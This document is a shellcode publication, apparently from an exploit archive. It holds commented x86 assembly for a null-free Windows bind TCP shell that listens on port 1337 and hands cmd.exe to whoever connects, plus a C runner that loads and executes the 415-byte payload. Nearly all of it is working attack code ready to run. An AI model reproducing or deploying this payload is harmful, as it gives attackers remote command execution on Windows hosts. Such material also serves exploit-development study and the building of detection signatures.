; Name: Windows/x86 - Bind TCP shellcode / Dynamic PEB & EDT method null-free Shellcode (415 bytes)
; Author: h4pp1n3ss
; Date: Wed 10/06/2021
; Tested on: Microsoft Windows [Version 10.0.19042.1237]

; Description:
; This a bind tcp shellcode that open a listen socket on 0.0.0.0 and port 1337. In order to accomplish this task the shellcode uses
; the PEB method to locate the baseAddress of the required module and the Export Directory Table to locate symbols.
; Also the shellcode uses a hash function to gather dynamically the required symbols without worry about the length.

 start:                            ;

   mov   ebp, esp                  ;
   add   esp, 0xfffff9f0           ; Avoid null-bytes and stack clobbering

 find_kernel32:

    xor   ecx, ecx                  ; ECX = Null
    mov   esi,fs:[ecx+0x30]         ; ESI = &(PEB) ([FS:0x30])
    mov   esi,[esi+0x0C]            ; ESI = PEB->Ldr
    mov   esi,[esi+0x1C]            ; ESI = PEB->Ldr.InInitOrder

 next_module:                       ;

    mov   ebx, [esi+0x08]           ; EBX = InInitOrder[X].base_address
    mov   edi, [esi+0x20]           ; EDI = InInitOrder[X].module_name
    mov   esi, [esi]                ; ESI = InInitOrder[X].flink (next module)
    cmp   [edi+12*2], cx            ; (unicode) module_name[12] == 0x00 / we found kernel32.dll?
    jne   next_module               ; No: try next module

 find_function_shorten:             ;

   jmp find_function_shorten_bnc    ; short jump

 find_function_ret:                 ;

    pop esi                         ; ESI = POP return addres
    mov   [ebp+0x04], esi           ; Save find_function address for later usage
    jmp resolve_symbols_kernel32    ;

 find_function_shorten_bnc:         ;
    call find_function_ret          ; Call fund_function_ret PUSH ret address into the stack

 find_function:                     ;

    pushad                          ; Save all registers
    mov   eax, [ebx+0x3c]           ; Offset of PE signature
    mov   edi, [ebx+eax+0x78]       ; Export Table Directory RVA
    add   edi, ebx                  ; Export Table Directory VMA
    mov   ecx, [edi+0x18]           ; NumberOfNames
    mov   eax, [edi+0x20]           ; AddressOfNames RVA
    add   eax, ebx                  ; AddresOfNames VMA
    mov   [ebp-4], eax              ; Save AddressOfName VMA for later usage

 find_function_loop:                ;
    jecxz find_function_finished    ; Jump to the end if ECX is 0
    dec   ecx                       ; Decrement our counter
    mov   eax, [ebp-4]              ; Restore AddressOfNames VMA
    mov   esi, [eax+ecx*4]          ; Get the RVA of the symbol name
    add   esi, ebx                  ; Set ESI to the VMA of the current symbol name

 compute_hash:                      ;
    xor   eax, eax                  ; EAX = Null
    cdq                             ; Null EDX
    cld                             ; Clear direction flag

 compute_hash_again:
    lodsb                           ; Load the next bytes from ESI into al
    test  al, al                    ; Check for Null terminator
    jz    compute_hash_finished     ; If the ZF is set, we've hit the NULL term
    ror   edx, 0x0d                 ; Rotate edx 13 bits to the right
    add   edx, eax                  ; Add the new byte to the accumulator
    jmp   compute_hash_again        ; Next iteration

 compute_hash_finished:             ;

 find_function_compare:
    cmp   edx, [esp+0x24]           ; Compare the computed hash with the requested hash
    jnz   find_function_loop        ; If it doesn't match go back to find_function_loop
    mov   edx, [edi+0x24]           ; AddressOfNameOrdinals RVA
    add   edx, ebx                  ; AddressOfNameOrdinals VMA
    mov   cx,  [edx+2*ecx]          ; Extrapolate the function's ordinal
    mov   edx, [edi+0x1c]           ; AddressOfFunctions RVA
    add   edx, ebx                  ; AddressOfFunctions VMA
    mov   eax, [edx+4*ecx]          ; Get the function RVA
    add   eax, ebx                  ; Get the function VMA
    mov   [esp+0x1c], eax           ; Overwrite stack version of eax from pushad

 find_function_finished:            ;
    popad                           ; Restore registers
    ret                             ;

 resolve_symbols_kernel32:          ;
    push 0x78b5b983                 ; TerminateProcess hash
    call dword  [ebp+0x04]          ; Call find_function
    mov   [ebp+0x10], eax           ; Save TerminateProcess address for later usage
    push 0xec0e4e8e                 ; LoadLibraryA hash
    call dword  [ebp+0x04]          ; Call find_function
    mov   [ebp+0x14], eax           ; Save LoadLibraryA address for later usage
    push 0x16b3fe72                 ; CreateProcessA hash
    call dword  [ebp+0x04]          ; Call find_function
    mov   [ebp+0x18], eax           ; Save CreateProcessA address for later usage

 load_ws2_32:                       ;
    xor   eax, eax                  ; EAX = Null
    mov ax, 0x6c6c                  ; EAX = 0x6c6c
    push eax                        ; ESP = "ll"
    push dword 0x642e3233           ; ESP = "32.dll"
    push dword 0x5f327377           ; ESP = "ws2_32.dll"
    push  esp                       ; ESP = &("ws2_32.dll")
    call dword  [ebp+0x14]          ; Call LoadLibraryA

resolve_symbols_ws2_32:
    mov   ebx, eax                  ; Move the base address of ws2_32.dll to EBX
    push 0x3bfcedcb                 ; WSAStartup hash
    call dword  [ebp+0x04]          ; Call find_function
    mov   [ebp+0x1C], eax           ; Save WSAStartup address for later usage
    push 0xadf509d9                 ; WSASocketA hash
    call dword  [ebp+0x04]          ; Call find_function
    mov   [ebp+0x20], eax           ; Save WSASocketA address for later usage
    push 0xc7701aa4                 ; Bind hash
    call dword  [ebp+0x04]          ; Call find_function
    mov   [ebp+0x24], eax           ; Save Bind address for later usage
    push 0xe92eada4                 ; listen hash
    call dword  [ebp+0x04]          ; Call find_function
    mov   [ebp+0x28], eax           ; Save listen address for later usage
    push 0x9f5b7976                 ; WSAGetLastError hash
    call dword  [ebp+0x04]          ; Call find_function
    mov   [ebp+0x32], eax           ; Save WSAGetLastError address for later usage
    push 0x498649e5                 ; accept hash
    call dword  [ebp+0x04]          ; Call find_function
    mov   [ebp+0x36], eax           ; Save acccept address for later usage

 call_wsastartup:                   ;
    mov   eax, esp                  ; Move ESP to EAX
    mov   cx, 0x590                 ; Move 0x590 to CX
    sub   eax, ecx                  ; Substract CX from EAX to avoid overwriting the structure later
    push  eax                       ; Push lpWSAData
    xor   eax, eax                  ; EAX = Null
    mov   ax, 0x0202                ; Move version to AX
    push  eax                       ; Push wVersionRequired (0x00000202)
    call dword  [ebp+0x1C]          ; Call WSAStartup(WORD wVersionRequired, LPWSADATA lpWSAData)

 call_wsasocketa:                   ; WSASocketA(AF_INET = 2, SOCK_STREAM = 1, TCP = 6, NULL, NULL, NULL )
    xor   eax,  eax                 ; EAX = Null
    push  eax                       ; Push dwFlags
    push  eax                       ; Push g
    push  eax                       ; Push lpProtocolInfo
    mov   al, 0x06                  ; Move AL, IPPROTO_TCP
    push  eax                       ; Push protocol
    sub   al, 0x05                  ; Substract 0x05 from AL, AL = 0x01
    push  eax                       ; Push type
    inc   eax                       ; Increase EAX, EAX = 0x02
    push  eax                       ; Push af
    call dword  [ebp+0x20]          ; Call WSASocketA(2,1,6,0,0,0)

 create_sockaddr_in_struct:         ; sockaddr_in {AF_INET = 2; p1337 = 0x3905; INADDR_ANY = 0x5D00A8C0}
    mov   esi, eax                  ; Move the SOCKET descriptor to ESI
    xor   eax, eax                  ; EAX = Null
    push eax                        ; Push sin_addr (any address 0.0.0.0)
    mov ax, 0x3905                  ; Move the sin_port (example: 1337) to AX (EAX = 0x00003905)
    shl   eax, 0x10                 ; Left shift EAX by 0x10 bytes (EAX = 0x39050000)
    add   ax, 0x02                  ; Add 0x02 (AF_INET) to AX
    push  eax                       ; Push sin_port & sin_family
    push  esp                       ; Push pointer to the sockaddr_in structure
    pop   edi                       ; EDI = &(sockaddr_in)

 call_bind:                         ; bind(SOCKET *s = ESI, const sockaddr *addr = EDI, int  namelen = 0x16)
    xor   eax, eax                  ; EAX = Null
    add   al, 0x16                  ; Set AL to 0x16
    push  eax                       ; Push namelen
    push  edi                       ; Push *addr
    push  esi                       ; Push s
    call dword  [ebp+0x24]          ; Call bind

 call_wsagetlaserror:               ; WSAGetLastError() (just for debugging purpouse)
    call dword  [ebp+0x32]          ; Call WSAGetLastError

 call_listen:                       ;
    xor  eax, eax                   ; EAX = Null
    push  eax                       ; Push backlog
    push  esi                       ; Push s
    call dword  [ebp+0x28]          ; Call WS2_32!listen

 call_accept:                       ; accept( SOCKET s, sockaddr *addr, int *addrlen)
    xor  eax, eax                   ; EAX = Null
    push  eax                       ; Push *addrlen (optional)
    push  eax                       ; Push *addr    (optional)
    push  esi                       ; Push socket HANDLE from WSASocketA()
    call dword  [ebp+0x36]          ; Call accept(SOCKET s ,Null, Null)

 create_startupinfoa:               ;
    mov   esi, eax                  ; Save Handle returned from accept() into ESI
    push  esi                       ; Push hStdError
    push  esi                       ; Push hStdOutput
    push  esi                       ; Push hStdInput
    xor   eax, eax                  ; EAX = Null
    push  eax                       ; Push lpReserved2
    push  eax                       ; Push cbReserved2 & wShowWindow
    mov   al, 0x80                  ; Move 0x80 to AL
    xor   ecx, ecx                  ; EAX = Null
    mov   cl, 0x80                  ; Move 0x80 to CL
    add   eax, ecx                  ; Set EAX to 0x100
    push  eax                       ; Push dwFlags
    xor   eax, eax                  ; EAX = Null
    push  eax                       ; Push dwFillAttribute
    push  eax                       ; Push dwYCountChars
    push  eax                       ; Push dwXCountChars
    push  eax                       ; Push dwYSize
    push  eax                       ; Push dwXSize
    push  eax                       ; Push dwY
    push  eax                       ; Push dwX
    push  eax                       ; Push lpTitle
    push  eax                       ; Push lpDesktop
    push  eax                       ; Push lpReserved
    mov   al, 0x44                  ; Move 0x44 to AL
    push  eax                       ; Push cb
    push  esp                       ; Push pointer to the STARTUPINFOA structure
    pop   edi                       ; Store pointer to STARTUPINFOA in EDI

 create_cmd_string:                 ;
    mov   eax, 0xff9a879b           ; Move 0xff9a879b into EAX
    neg   eax                       ; Negate EAX, EAX = 00657865
    push  eax                       ; Push part of the "cmd.exe" string
    push  0x2e646d63                ; Push the remainder of the "cmd.exe" string
    push  esp                       ; Push pointer to the "cmd.exe" string
    pop   ebx                       ; Store pointer to the "cmd.exe" string in EBX

 call_createprocessa:               ;
    mov   eax, esp                  ; Move ESP to EAX
    xor   ecx, ecx                  ; ECX = Null
    mov   cx, 0x390                 ; Move 0x390 to CX
    sub   eax, ecx                  ; Substract CX from EAX to avoid overwriting the structure later
    push  eax                       ; Push lpProcessInformation
    push  edi                       ; Push lpStartupInfo
    xor   eax, eax                  ; EAX = Null
    push  eax                       ; Push lpCurrentDirectory
    push  eax                       ; Push lpEnvironment
    push  eax                       ; Push dwCreationFlags
    inc   eax                       ; Increase EAX, EAX = 0x01 (TRUE)
    push  eax                       ; Push bInheritHandles
    dec   eax                       ; EAX = Null
    push  eax                       ; Push lpThreadAttributes
    push  eax                       ; Push lpProcessAttributes
    push  ebx                       ; Push lpCommandLine
    push  eax                       ; Push lpApplicationName
    call dword  [ebp+0x18]          ; Call CreateProcessA

 call_terminate_process:            ;
    xor  eax, eax                   ; EAX = Null
    push  eax                       ; uExitCode
    push  0xffffffff                ; HANDLE hProcess
    call dword  [ebp+0x04]          ; Call TerminateProcess


[*]================================= POC =============================== [*]



/*

 Shellcode runner author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// nasm -f win32 shellcode.asm -o shellcode.o
// objdump -D ./shellcode.o |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'


unsigned char payload[] =
		"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b"
		"\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06"
		"\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03"
		"\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b"
		"\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca"
		"\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b"
		"\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3"
		"\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e\x0e\xec\xff\x55"
		"\x04\x89\x45\x14\x68\x72\xfe\xb3\x16\xff\x55\x04\x89\x45\x18\x31\xc0\x66"
		"\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x55\x14"
		"\x89\xc3\x68\xcb\xed\xfc\x3b\xff\x55\x04\x89\x45\x1c\x68\xd9\x09\xf5\xad"
		"\xff\x55\x04\x89\x45\x20\x68\xa4\x1a\x70\xc7\xff\x55\x04\x89\x45\x24\x68"
		"\xa4\xad\x2e\xe9\xff\x55\x04\x89\x45\x28\x68\x76\x79\x5b\x9f\xff\x55\x04"
		"\x89\x45\x32\x68\xe5\x49\x86\x49\xff\x55\x04\x89\x45\x36\x89\xe0\x66\xb9"
		"\x90\x05\x29\xc8\x50\x31\xc0\x66\xb8\x02\x02\x50\xff\x55\x1c\x31\xc0\x50"
		"\x50\x50\xb0\x06\x50\x2c\x05\x50\x40\x50\xff\x55\x20\x89\xc6\x31\xc0\x50"
		"\x66\xb8\x05\x39\xc1\xe0\x10\x66\x83\xc0\x02\x50\x54\x5f\x31\xc0\x04\x16"
		"\x50\x57\x56\xff\x55\x24\xff\x55\x32\x31\xc0\x50\x56\xff\x55\x28\x31\xc0"
		"\x50\x50\x56\xff\x55\x36\x89\xc6\x56\x56\x56\x31\xc0\x50\x50\xb0\x80\x31"
		"\xc9\xb1\x80\x01\xc8\x50\x31\xc0\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50"
		"\xb0\x44\x50\x54\x5f\xb8\x9b\x87\x9a\xff\xf7\xd8\x50\x68\x63\x6d\x64\x2e"
		"\x54\x5b\x89\xe0\x31\xc9\x66\xb9\x90\x03\x29\xc8\x50\x57\x31\xc0\x50\x50"
		"\x50\x40\x50\x48\x50\x50\x53\x50\xff\x55\x18\x31\xc0\x50\x6a\xff\xff\x55"
		"\x04";

unsigned int payload_len = 415;

int main(void) {

	void * exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	RtlMoveMemory(exec_mem, payload, payload_len);

	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("Shellcode Length:  %d\n", strlen(payload));

	if ( rv != 0 ) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);

	}

	return 0;
}